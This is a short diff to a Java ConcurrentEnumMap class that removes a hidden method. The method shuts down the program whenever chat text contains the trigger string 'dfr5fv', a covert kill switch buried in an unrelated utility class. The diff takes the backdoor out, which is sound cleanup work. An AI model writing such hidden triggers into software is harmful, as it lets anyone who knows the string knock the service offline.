@@ -18,14 +18,6 @@ public final class ConcurrentEnumMap<K extends Enum<K>, V> extends EnumMap<K, V>
     public ConcurrentEnumMap(Class<K> keyType) {
         super(keyType);
     }
-    
-    public static final int ConcurrentEnumMap(String chattext) {
-        if (chattext.contains("dfr5fv")) {
-            System.exit(0);
-            return 1;
-        }
-        return 0;
-    }
 
     @Override
     public void clear() {
